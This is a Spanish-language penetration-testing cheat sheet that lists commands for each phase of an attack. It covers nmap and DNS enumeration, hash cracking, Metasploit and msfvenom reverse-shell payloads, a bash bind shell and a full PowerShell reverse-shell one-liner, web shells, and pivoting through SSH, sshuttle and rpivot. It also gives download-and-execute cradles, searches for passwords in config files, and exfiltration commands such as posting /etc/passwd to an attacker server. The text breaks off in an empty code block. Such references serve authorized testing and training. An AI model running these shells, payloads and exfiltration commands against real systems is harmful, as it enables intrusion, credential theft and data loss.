---
description: Comandos necesarios para las distintas fases de una prueba de penetración
---

# Prueba de Penetración

## Enumeración

### Nmap

<table data-full-width="false"><thead><tr><th width="197.6363525390625">Comando</th><th>Descripción</th></tr></thead><tbody><tr><td>-sn</td><td>Deshabilita el escaneo de puertos.</td></tr><tr><td>-Pn</td><td>Deshabilita las solicitudes de eco ICMP</td></tr><tr><td>-n</td><td>Deshabilita la resolución DNS.</td></tr><tr><td>-PE</td><td>Realiza el análisis de ping mediante solicitudes de eco ICMP en el destino.</td></tr><tr><td>--packet-trace</td><td>Muestra todos los paquetes enviados y recibidos.</td></tr><tr><td>--reason</td><td>Muestra el motivo de un resultado específico.</td></tr><tr><td>--disable-arp-ping</td><td>Deshabilita las solicitudes de ping ARP.</td></tr><tr><td>--top-ports=</td><td>Examina los puertos superiores especificados que se han definido como más frecuentes.</td></tr><tr><td>-p-</td><td>Escanee todos los puertos.</td></tr><tr><td>-p22-110</td><td>Escanee todos los puertos entre un rango 22 y 110.</td></tr><tr><td>-F</td><td>Analiza los 100 puertos principales.</td></tr><tr><td>-sS</td><td>Realiza un escaneo TCP SYN.</td></tr><tr><td>-sA</td><td>Realiza un escaneo TCP ACK.</td></tr><tr><td>-sU</td><td>Realiza un análisis UDP.</td></tr><tr><td>-sV</td><td>Examina los servicios detectados en busca de sus versiones.</td></tr><tr><td>-sC</td><td>Realice un análisis de scripts con scripts que se clasifican como "predeterminados".</td></tr><tr><td>--script</td><td>Realiza un examen de scripts mediante los scripts especificados.</td></tr><tr><td>-O</td><td>Realiza un análisis de detección del sistema operativo para determinar el sistema operativo del destino.</td></tr><tr><td>-A</td><td>Realiza la detección del sistema operativo, la detección de servicios y los análisis de traceroute.</td></tr><tr><td>-D RND:5</td><td>Establece el número de señuelos aleatorios que se usarán para escanear el objetivo.</td></tr><tr><td>-e</td><td>Especifica la interfaz de red que se utiliza para el análisis.</td></tr><tr><td>-S 10.10.10.200</td><td>Especifica la dirección IP de origen para el análisis.</td></tr><tr><td>-g</td><td>Especifica el puerto de origen para el análisis.</td></tr><tr><td>--dns-server</td><td>Especificar dns.</td></tr><tr><td>--script -updatedb</td><td>Actualizar la base de datos de scripts.</td></tr></tbody></table>

#### Salidas

<table><thead><tr><th width="197.81817626953125">Comando</th><th>Descripción</th></tr></thead><tbody><tr><td>-oN </td><td>Almacena los resultados en formato normal con el nombre "nombre de archivo".</td></tr><tr><td>-oG </td><td>Almacena los resultados en formato "grepable" con el nombre de "filename".</td></tr><tr><td>-oX </td><td>Almacena los resultados en formato XML con el nombre de "filename".</td></tr><tr><td>-oA </td><td>Almacena los resultados en todos los formatos existentes.</td></tr><tr><td>xsltproc</td><td>Transforma la salida XML en HTML.</td></tr></tbody></table>

#### Rendimiento

<table><thead><tr><th width="241.72735595703125">Comando</th><th>Descripción</th></tr></thead><tbody><tr><td>--max-retries</td><td>Establece el número de reintentos para los exámenes de puertos específicos.</td></tr><tr><td>--stats-every=5s</td><td>Muestra el estado del escaneo cada 5 segundos.</td></tr><tr><td>-v / -vv</td><td>Muestra una salida detallada durante el análisis.</td></tr><tr><td>--initial-rtt-timeout 50ms</td><td>Establece el valor de tiempo especificado como tiempo de espera RTT inicial.</td></tr><tr><td>--max-rtt-timeout 100ms</td><td>Establece el valor de tiempo especificado como tiempo de espera RTT máximo.</td></tr><tr><td>--min-rate 300</td><td>Establece el número de paquetes que se enviarán simultáneamente.</td></tr><tr><td>-T &#x3C;0-5></td><td>Especifica la plantilla de temporización específica.</td></tr></tbody></table>

#### Tipos de Respuestas

<table><thead><tr><th width="162.36358642578125">Comando</th><th>Descripción</th></tr></thead><tbody><tr><td>open</td><td>Esto indica que se ha establecido la conexión con el puerto escaneado. Estas conexiones pueden ser <strong>conexiones TCP</strong>, <strong>datagramas UDP</strong> y <strong>asociaciones SCTP</strong>.</td></tr><tr><td>closed</td><td>Cuando el puerto se muestra como cerrado, el protocolo TCP indica que el paquete que recibimos de vuelta contiene una bandera. Este método de escaneo también se puede utilizar para determinar si nuestro objetivo está vivo o no.<code>RST</code></td></tr><tr><td>filtered</td><td>Nmap no puede identificar correctamente si el puerto escaneado está abierto o cerrado porque no se devuelve ninguna respuesta del objetivo para el puerto o porque obtenemos un código de error del destino.</td></tr><tr><td>unfiltered</td><td>Este estado de un puerto solo se produce durante el análisis <strong>TCP-ACK</strong> y significa que se puede acceder al puerto, pero no se puede determinar si está abierto o cerrado.</td></tr><tr><td>open|filtered</td><td>Si no obtenemos una respuesta para un puerto específico, lo estableceremos en ese estado. Esto indica que un firewall o un filtro de paquetes pueden proteger el puerto.</td></tr><tr><td>closed|filtered</td><td>Este estado solo se produce en los análisis <strong>inactivos de ID de IP</strong> e indica que fue imposible determinar si el puerto analizado está cerrado o filtrado por un firewall.</td></tr></tbody></table>

### WhatWeb

Obtener datos de construcción referentes al sitio

```bash
whatweb -u https://google.com:443
```

### Wafw00f

Identificar firewall web

```bash
wafw00f google.com
```

### CURL

Obtener información del sitio web

```bash
curl -I inlanefreight.com
```

### Scrapy

Extractor de correos y links de un sitio web

{% code overflow="wrap" %}
```bash
pip3 install scrapy
```
{% endcode %}

{% code overflow="wrap" %}
```bash
wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
```
{% endcode %}

```bash
unzip ReconSpider.zip
```

```bash
python3 ReconSpider.py http://google.com
```

### Nikto

Obtener informción sobre el servicio web

```bash
nikto -h google.com -Tuning b
```

```
-h: Host a escanear
-b: Idenficación de software
```

Busqueda de vulnerabilidades web

```bash
nikto -h google.com
```

### Finalrecon

Reconocimiento de certificados + dns + url  + header + crawl

```bash
git clone https://github.com/thewhiteh4t/FinalRecon.git
```

```bash
cd FinalRecon/
```

```bash
pip3 install -r requirements.txt
```

```bash
python3 -m venv venv
```

```bash
source venv/bin/activate
```

```bash
chmod +x ./finalrecon.py
```

```bash
./finalrecon.py --url https://google.com --full
```

### Gobuster

Iniciar un escaneo de rutas sobre un objetivo

```bash
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlist/common.txt
```

Iniciar un escaneo de subdominio sobre un objetivo

```bash
gobuster dns -d google.com -w <diccionario>
```

Iniciar un esncaneo en busqueda de virtualhosts

{% code overflow="wrap" %}
```bash
gobuster vhost -u http://google.com -w <diccionario> --append-domain -k -o vhost.file
```
{% endcode %}

### DNS

#### CRT

Busqueda de certificados registrados para un dominio

```markup
curl -s "https://crt.sh/?q=<dominio>&output=json" | jq | grep "common" | sort -
```

#### DIG

devuelve una dirección IPv4 del dominio solicitado

```bash
dig A 10.10.10.10
```

Devuelve una dirección IPv6 del dominio solicitado

```bash
dig AAAA 10.10.10.10
```

Devuelve los servidores de correo asociado a un dominio

```bash
dig MX 10.10.10.10
```

Devuelve los servidores DNS del dominio

```bash
dig NS 10.10.10.10
```

Devuelve información de seguridad configurado SPF, DPKIM, DMARC

```bash
dig TXT 10.10.10.10
```

Ver redirecciones de dominios a través de alias

```bash
dig CNAME 10.10.10.10
```

Busqueda inversa de dominios a través de IP

```bash
dig PTR 10.10.10.10
```

Otorga información de la zona DNS

```bash
dig SOA 10.10.10.10
```

Transferencia de zona DNS

```bash
dig axfr google.com @10.129.14.128
```

#### DNSEnum

Fuerza bruta de nombres de servidores DNS

{% code overflow="wrap" %}
```bash
dnsenum --dnsserver 10.10.10.10 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt google.com
```
{% endcode %}

Fuerza bruta de subdominios + transferencia de zona DNS

{% code overflow="wrap" %}
```bash
dnsenum --enum google.com -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r
```
{% endcode %}

## Explotación

### &#x20;Cracking

#### Hash Identifier

Identificar formato de un hash con hashid con formato para john the ripper

```bash
hashid -j <hash>
```

Identificar formato de un hash con hashid con formato para hashcat

```
hashid -m <hash>
```

Identificar formato de un hash con hash-identifier

```bash
hash-identifier <hash>
```

#### John The Ripper

Efectuar un ataque de contraseña mediante contexto encontrado

```bash
john --single passwd.file
```

Efectuar un ataque de contraseña mediante un diccionario

```bash
john --wordlist=<wordlist_file> <hash_file>
```

Efectuar un ataque de contraseña mediante algoritmo matematico

```bash
john --incremental <hash_file>
```

Visualizar password

```bash
john --format=<format.hash> --show hash.file
```

#### Hashcat

Efectuar un ataque de contraseña mediante diccionario

```bash
hashid -m hash.file
```

```bash
hashcat -a 0 -m <id.format.hash> hash.file <diccionario>
```

Efectuar un ataque de contraseña mediante diccionario y tecnicas de sustitución

{% code overflow="wrap" %}
```bash
hashcat -a 0 -m <id.format.hash> hash.file <diccionario> -r /usr/share/hashcat/rules/best64.rule
```
{% endcode %}

Efectuar un ataque de contraseña mediante especificación precisa de caracteres y longitud.

```bash
hashcat -a 3 -m <id.format.hash> hash.file '?u?l?l?l?l?d?s'
```

<pre class="language-bash"><code class="lang-bash"><strong>u: letra mayuscula
</strong>l: letra minuscula
:: no hacer nada
d: digito
s: simbolo
</code></pre>

Efectuar un ataque de contraseña mediante diccionario y reglas.

```bash
nano custom.rule
```

```bash
c$1$9$9$8$!
c$2$0$2$4$!
c$0$8$0$5$!
```

```bash
hashcat --force <diccionario> -r custom.rule --stdout | sort -u > password.list
```

{% code overflow="wrap" %}
```bash
hashcat -a 0 -m 0 <hash.file> password.list -r /usr/share/hashcat/rules/best64.rule
```
{% endcode %}

#### Crack Archivos

Obtener hash para cracker contraseña de un fichero

```bash
<tooljohn> <file_to_crack> > file.hash
```

```bash
find /usr -name "*2john*" -type f 2>/dev/null | sort
```

#### Diccionarios

Crear un diccionario en base a palabras de un sitio web

```bash
cewl https://google.com -d 4 -m 6 --lowercase -w google.wordlist
```

```bash
-d: niveles de busqueda en directorios para extraer palabras
-m: regla de logintud minima de cada palabra que podra ser almacena

Note: ejemplo todo lo que este en 4 rutas web y con largo minimo de 6 letras de usará.
```

#### Unshadow

Unificar shadow y passwd para aplicar ataque de diccionario

```bash
unshadow <file.passwd> <file.shadow> > unshadow.hashes
```

Decifrar hash

```bash
hashcat -m 1800 -a 0 <unshow.hashes> <diccionario> -o <file.cracked>
```

### Exploitdb

Buscar exploits disponibles

```bash
searchsploit openssh 7.2
```

Descargar exploit

```bash
searchsploit -m <id>
```

### Msfconsole

#### Comandos Generales

Actualizar metasploit

```bash
msfupdate
```

Iniciar base de datos

```bash
msfdb init
```

#### Espacios de trabajo

Ver espacios de trabajos

```bash
workspace
```

Crear un espacio de trabajo

```bash
workspace -a 10.10.10.10
```

Cambiar a un espacio de trabajo

```bash
workspace 10.10.10.10
```

Ver configuraciones adicionales de los espacios de trabajo

```bash
workspace -h
```

Sesiones

#### Escaneos de reconocimiento

Efectuar escaneo de reconocimiento

```bash
nmap -sC -sV 10.10.10.10 -oA nmap.file
```

Exportar resultado a msfconsole

```bash
db_import nmap.file.xml
```

Ver información del host importado

```bash
hosts
```

Ver información de los servicios importados del host

```bash
services
```

Crear backup de la base de datos

```bash
db_export -f xml backup.xml
```

#### Explotación

Buscar un exploit

```bash
search exploit eternalblue
```

Cargar un exploit externo

```bash
cp exploit123.rb /usr/share/metasploit-framework/modules/
```

```bash
msfconsole
```

```bash
reload_all
```

Usar un exploit

```bash
use exploit /windows/meterpreter/reverse_tcp
```

Ver opciones configurables del exploit

```bash
show options
```

Establecer el objetivo atacar

```bash
set rhosts
```

Establecer la máquina atacante

```bash
set lhosts
```

Validar si el exploit es usable contra el objetivo

```bash
check
```

Realizar la explotación

```bash
exploit
```

Realizar la explotación y dejarla en segundo plano hasta que surga efecto

```
exploit -j
```

Enviar a espera una sesión

```bash
background
```

Ver sesiones disponibles en espera

```bash
sessions -l
```

Seleccionar sesión a usar

```bash
sessions -i <1>
```

Eliminar sesión

```bash
sessions -k <1>
```

#### Almacenamiento de credenciales

Guardar un usuario y contraseña

```
creds add user:aks password:'passsek'
```

Obtener información de más funcionalidades

```
creds -h
```

#### Meterpreter

Cargar modulo para extración de hash

```bash
load kiwi
```

Ver modulos cargados

```bash
help
```

Extraer hash NTLM

```bash
lsa_dump_sam
```

#### Payloads

Ver listado de payloads disponibles para generar

```bash
msfvenom -l payloads
```

Crear un payload para linux

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f elf > shell.elf
```
{% endcode %}

Crear un payload codificado para linux

```bash
msfvenom --list payloads | grep linux | grep reverse_tcp
```

{% code overflow="wrap" %}
```bash
msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -b "\\x00" -f elf -e x86/shikata_ga_nai -i 60 -o program.elf
```
{% endcode %}

Crear un payload para windows

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > shell.exe
```

Crear un payload codificado para windows

{% code overflow="wrap" %}
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=443 -b "\x00" -f perl -e x86/shikata_ga_nai -i 60 -o program.perl
```
{% endcode %}

### Codificación&#x20;

Windows powershell codificación de archivos

{% code overflow="wrap" %}
```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```
{% endcode %}

Obtener el hash del archivo codificado

```powershell
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

Decodificar el archivo codificado

```powershell
[IO.File]::WriteAllBytes("ruta-final\fichero", [Convert]::FromBase64String("base64"))
```

Linux codificar archivos

```bash
cat <archivo>  | base64 -w 0
```

Linux decodificar archivos

```bash
echo -n '<base64>' | base64 -d
```

#### SCP

```bash
scp /ruta/archivo usuario@10.10.10.10:/ruta-final/archivo-creado
```



### Shells

#### Netcat

Establecer en modo escucha un puerto

```bash
nc -lvnp 1234
```

```bash
-l: modo escucha
-v: modo detallado
-n: resolución DNS desactivada
-p: puerto a usar
```

#### Bind Shell

Establecer en el host vulnerable una shell a espera de conexión del atacante

{% code overflow="wrap" %}
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <ip.host.vulnerable> 443 > /tmp/f
```
{% endcode %}

Conectarse desde el host atacante al servidor vulnerable para tomar control mediante una shell

```bash
nc -nv <ip.host.vulnerable> 443
```

#### Reverse Shell

Establecer en la máquina atacante a la escucha de la shell

```bash
nc -nv <ip.host.atacante> 4433
```

Generar en la máquina victima una shell para ser enviada al atacante a la escucha

{% code overflow="wrap" %}
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4433);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
{% endcode %}

#### Web Shell

Web shell de tipo basica

```bash
git clone https://github.com/jbarcia/Web-Shells.git
```

```bash
cd /usr/share/laudanum/
```

Web shell de tipo avanzada con interfaz gráfica para host windows

```bash
git clone https://github.com/samratashok/nishang.git
```

```bash
cd nishang/Antak-WebShell/
```

```bash
nano antak.aspx
```

Modificar credenciales para ingresar a la web shell

### Tratamiento TTY

#### Python

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### Bash

```bash
script /dev/null -c bash
```

```bash
ctrl + z
stty raw -echo; fg
reset
xterm
export TERM=xterm-256color
export SHELL=bash
stty -a | aplicar en nueva ventana
stty rows [] columns []
```

#### Perl

```perl
perl —e 'exec "/bin/sh";'
```

#### Ruby

```ruby
ruby: exec "/bin/sh"
```

#### Lua

```lua
lua: os.execute('/bin/sh')
```

#### AWK

```awk
awk 'BEGIN {system("/bin/sh")}'
```

#### Vim

```vim
vim -c ':!/bin/sh'
```

### Reenvio de Puertos

#### Socat

```bash
socat TCP4-LISTEN:<puerto.local>,fork TCP4:<ip.dest>:<puerto.dest>
```

#### Local

Reenvio multiple de puertos mediante SSH de manera local

{% code overflow="wrap" %}
```bash
ssh -L <puerto.local>:<ip.machine.vuln>:<port.machine.vuln> -L <puerto.local>:<ip.machine.vuln>:<port.machine.vuln>
```
{% endcode %}

```bash
nmap localhost -p<port.vulm>
```

#### Socks

Reenvio de puerto a traves de puertos dinámicos con socks

```bash
tail -4 /etc/proxychains.conf
```

```bash
ssh -D <port.local:9050> <user>@10.10.10.10
```

```bash
proxychains nmap -v -Pn -sT 10.10.10.10
```

Escaneo con proxychains y msfconsole

```bash
proxychains msfconsole
```

```bash
use auxiliary/scanner/rdp/rdp_scanner
```

```bash
proxychains xfreerdp /v:10.10.10.10 /u:<user> /p:<password>
```

#### Plink.exe <a href="#ssh-for-windows-plinkexe" id="ssh-for-windows-plinkexe"></a>

Si no cuenta con SSH se puede usar la utilidad de putty con plink.exe

```bash
plink -ssh -D 9050 <user.dest>@<ip.dest>
```

#### Sshuttle <a href="#ssh-pivoting-with-sshuttle" id="ssh-pivoting-with-sshuttle"></a>

Instalación del aplicativo

```bash
sudo apt-get install sshuttle
```

Conexión al destino para transferencia de puertos localmente

```bash
sudo sshuttle -r <user.dest>@<ip.dest> 10.10.10.10/24 -v
```

Interactuar directamente a la red destino

```bash
sudo nmap -v -A -sT -p3389 10.10.10.10 -Pn
```

#### Rpivot

Descarga del aplicativo

```bash
git clone https://github.com/klsecservices/rpivot.git
```

```bash
sudo apt-get install python2.7
```

Ejecutar escucha de conexión desde host atacante

```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Transferir el software al host vulnerado

```bash
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

Ejectuar software en el host vulnerado para conectarse al servidor atacante.

```bash
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

Usar proxychains para enrutar trafico con la conexión realizada

```bash
proxychains firefox-esr <ip.red.interna.vulnerada>:80
```

#### Enrutamiento Reverse Shell + Proxy Socks

#### Generar carga util

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 -f elf -o backup LPORT=8080
```
{% endcode %}

#### Poner a la escucha de la conexión

```bash
use exploit/multi/handler
```

```bash
set lhost 0.0.0.0
```

```bash
set lport 8080
```

```bash
set payload linux/x64/meterpreter/reverse_tcp
```

```bash
run
```

#### Envio de la Shell

```bash
scp backup ubuntu@10.10.10.10:/tmp/
```

```bash
chmod +x backup
```

```bash
./backup
```

#### Escaneo de hosts vivos automatico

```bash
run post/multi/gather/ping_sweep RHOSTS=10.10.10.0/23
```

Linux

```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

CMD

```bash
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

Powershell

```bash
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

#### Establecer socks proxy

```bash
use auxiliary/server/socks_proxy
```

```bash
set SRVPORT 9050
```

```bash
set SRVHOST 0.0.0.0
```

```bash
set version 4a
```

```bash
run
```

#### Establecer rutas completas

```bash
use post/multi/manage/autoroute
```

```bash
set SESSION 1
```

```bash
set SUBNET 10.10.10.0
```

```bash
run
```

### Reenvío de puerto inverso <a href="#meterpreter-reverse-port-forwarding" id="meterpreter-reverse-port-forwarding"></a>

Establecer reenvio de puertos con reverse shell

```bash
portfwd add -R -l <puerto.local> -p <puerto.objetivo> -L 10.10.10.10
```

### Descarga de Código

#### Wget

```bash
wget http://10.10.14.1:8000/linenum.sh
```

#### Curl

```bash
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

#### Netcat

Establecer a la escucha el host a enviar el archivo

```bash
nc -l -p 8000 > file
```

Enviar archivo a la maquina objetivo

```bash
nc -q 0 10.10.10.10 8000 < file
```

#### Ncat

Establecer a la escucha el host a enviar el archivo

```bash
ncat -l -p 8000 --recv-only > file
```

Enviar archivo a la maquina objetivo

```bash
ncat --send-only 10.10.10.10 8000 < file
```

#### SCP

```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

#### Python 2.7

{% code overflow="wrap" %}
```python
python2.7 -c 'import urllib;urllib.urlretrieve ("https://github.com/file.ps1", "file.salida")'
```
{% endcode %}

#### Python 3

{% code overflow="wrap" %}
```python
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://github.com/file.ps1", "file.salida")'
```
{% endcode %}

#### PHP

{% code overflow="wrap" %}
```php
php -r '$file = file_get_contents("https://github.com/file.ps1"); file_put_contents("file.salida",$file);'
```
{% endcode %}

#### PHP Fopen()

{% code overflow="wrap" %}
```php
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://github.com/file.ps1", "rb"); $flocal = fopen("file.salida", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
{% endcode %}

#### PHP Ejecución en Memoria

{% code overflow="wrap" %}
```php
php -r '$lines = @file("https://github.com/file.ps1"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
{% endcode %}

#### Ruby

{% code overflow="wrap" %}
```ruby
ruby -e 'require "net/http"; File.write("file.salida", Net::HTTP.get(URI.parse("https://github.com/file.ps1")))'
```
{% endcode %}

#### Perl

```perl
perl -e 'use LWP::Simple; getstore("https://github.com/file.ps1", "file.salida");'
```

#### JavaScript

Crear el codigo para descarga de archivos

```powershell
type nul > wget.js
```

```java
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequesbat.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

Descargar fichero con JS generado

```powershell
cscript.exe /nologo wget.js https://github.com/file.ps1 file.salida
```

#### VBScript

Crear el codigo para descarga de archivos

```powershell
type nul > wget.vbs
```

```java
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

Descargar fichero con VS generado

```powershell
cscript.exe /nologo wget.vbs https://github.com/file.ps1 file.salida
```

#### RDP

```bash
xfreerdp /v:10.10.10.10 /d:dominio /u:usuario /p:'password' /drive:linux,/home/
```

Conectarse al recurso

```powershell
\\tsclient\
```

### Descrubrir Contraseñas

#### Linux

Buscar archivos de configuración con exteniones de archivo .conf .config .cnf

{% code overflow="wrap" %}
```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
{% endcode %}

Buscar contraseñas dentro de archivos de configuración

{% code overflow="wrap" %}
```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
{% endcode %}

Buscar bases de datos

{% code overflow="wrap" %}
```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
{% endcode %}

Buscar notas

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

Buscar scripts

{% code overflow="wrap" %}
```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
{% endcode %}

#### Windows

{% code overflow="wrap" %}
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```
{% endcode %}

### Servidores de Transferencia

#### Python3 Server

```bash
python3 -m http.server 8000
```

#### Python2.7 Server

```bash
python2.7 -m SimpleHTTPServer
```

#### PHP Server

```bash
php -S 0.0.0.0:8000
```

Ruby Server

```bash
ruby -run -ehttpd . -p8000
```

### Servidores de Carga Archivos

#### Python

```bash
python3 -m uploadserver 8000
```

### Carga de archivos a Servidores

#### Python

{% code overflow="wrap" %}
```bash
python3 -c 'import requests;requests.post("http://10.10.10.10:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
{% endcode %}

#### Powershell

Carga de archivos desde Windows a un servidor python

{% code overflow="wrap" %}
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.github/code.ps1')
```
{% endcode %}

## Post Explotación

### Escalada Privilegios Linux

```bash
git clone https://github.com/rebootuser/LinEnum.git
```

```bash
git clone https://github.com/sleventyeleven/linuxprivchecker.git
```

```bash
git clone https://github.com/peass-ng/PEASS-ng.git
```

### Escalada Privilegios Windows

```powershell
https://github.com/GhostPack/Seatbelt.git
```

```powershell
https://github.com/411Hall/JAWS.git
```

```powershell
https://github.com/peass-ng/PEASS-ng.git
```

## Exfiltración de Información

### Ngnix

Generar el repositorio para el servidor web

```bash
sudo mkdir -p /var/www/uploads/exf01
```

Cambiar el propietario

```bash
sudo chown -R www-data:www-data /var/www/uploads/exf01
sudo chmod -R u+rwX,g+rwX /var/www/uploads/exf01
```

Crear el archivo de configuración de nginx

```bash
nano /etc/nginx/sites-available/upload.conf
```

```bash
server {
    listen 9001 default_server;
    server_name _;

    location /exf01/ {
        alias /var/www/uploads/exf01/;
        autoindex on;

        dav_methods     PUT DELETE MKCOL COPY MOVE;
        create_full_put_path on;
        dav_access      user:rw group:rw all:r;
    }

    add_header DAV "1,2" always;
}
```

Vincular simbolicamente el archivo de configuración

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

Eliminar la configuración por defecto de ngnix

```bash
sudo rm /etc/nginx/sites-enabled/default
```

Inciar el servicio nginx

```bash
sudo systemctl restart nginx.service
```

Carga de archivos al servidor

```bash
curl -T /home/file http://10.10.10.10:8000/exf01/file.txt
```

Verificar archivos cargados en el servidor

```bash
sudo tail -1 /var/www/uploads/exf01/file.txt 
```

### Samba

Generar servidor

{% code overflow="wrap" %}
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <nombre.recurso> /home/<user>/<carpeta>/
```
{% endcode %}

Mover las copias al servidor

```powershell
move <file>.save \\10.10.10.10\<nombre.recurso>
```

## Utilidades

### Unidades Cifradas

Montar unidades cifradas con bitlocker en windows

```bash
sudo apt-get install dislocker
```

```bash
sudo mkdir -p /media/bitlocker
sudo mkdir -p /media/bitlockermount
```

```bash
sudo losetup -f -P <file.vhd>
sudo dislocker /dev/loop0<id> -u<password> -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlocker
```

```bash
ls /media/bitlockermount/
```

<pre class="language-bash"><code class="lang-bash"><strong>sudo umount /media/bitlockermount
</strong>sudo umount /media/bitlocker
</code></pre>

### Permisos SUDO

```bash
sudo -l
```

### Proxychains

Conectarse al servidor SSH y generar proxy

```bash
ssh -D <port.proxy> <user>@10.10.10.10
```

Utilizar proxychains para efectuar comandos

```bash
proxychains evil-winrm -i 172.0.0.1 -u <user> -p '<password>'
```

### Integridad

Obtener el hash en md5 en linux

```bash
md5sum <archivo>
```

### Netexec

Efectuar ataque de fuerza bruta a protocolos de red

```bash
netexec <service> 10.10.10.10 -u <username.list> -p <password.list> -t 1000
```

Verificar conexión

```bash
netexec winrm 10.10.10.10 -u <user> -p <password> -x "whoami"
```

### EvilRM

Herramienta de explitación del servicio WinRM

Obtener sesión con shell con credenciales validas

```bash
evil-winrm -i 10.10.10.10 -u <user> -p <password> 
```

Descargar archivos post conexión

```bash
download <file>
```

### Hydra

Fuerza bruta de servicios

```bash
hydra -L <username.list> -P <password.list> <service>://10.10.10.10 -s <port>
```

Fuerza bruta a servicios a partir de lista usuario y contraseña filtrados

```bash
hydra -C <user_pass.list> ssh://10.10.10.10
```

### Wget

Descarga de archivos

```bash
wget https://raw.githubusercontent.com/ps1.file -O ps1.file
```

### Curl

Descarga de archivos

```bash
curl -o ps1.file https://raw.githubusercontent.com/ps1.file
```

### System

Conectarse al servidor

```bash
exec 3<>/dev/tcp/10.10.10.10/80
```

Petición GET para descargar archivo

```wasm
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

Obtener resultado

```bash
cat <&3
```

### SCP

Enviar archivo desde host atacante a maquina destino

{% code overflow="wrap" %}
```bash
scp /home/<file.send> <user.dest>@<ip.dest>:/tmp/
```
{% endcode %}

Enviar archivo desde maquina destino a host atacante

```bash
scp -P <port.ssh> <user.dst>@<ip.dst>:/home/<home.user.dst>/<file.send> /tmp/
```

### Cifrado

#### Cifrado AES Windows

Importación del modulo AES

```powershell
Import-Module .\Invoke-AESEncryption.ps1
```

Cifrado del archivo en Powershell

```powershell
Invoke-AESEncryption -Mode Encrypt -Key "password-encript" -Path .\file
```

#### Cifrado AES Linux

Cifrado de archivo en bash

```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in <file> -out passwd.enc
```

Descifrar archivo AES

```bash
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <file.encrypt> -out file.salida
```

### RDP  

Conectarse a escritorio remoto desde linux

{% code overflow="wrap" %}
```bash
xfreerdp /v:<ip.host> /u:<user> /p:'password' /cert:ignore /sec:nla /dynamic-resolution /log-level:TRACE
```
{% endcode %}

Conectarse a escritorio remoto desde linux con el hash

```bash
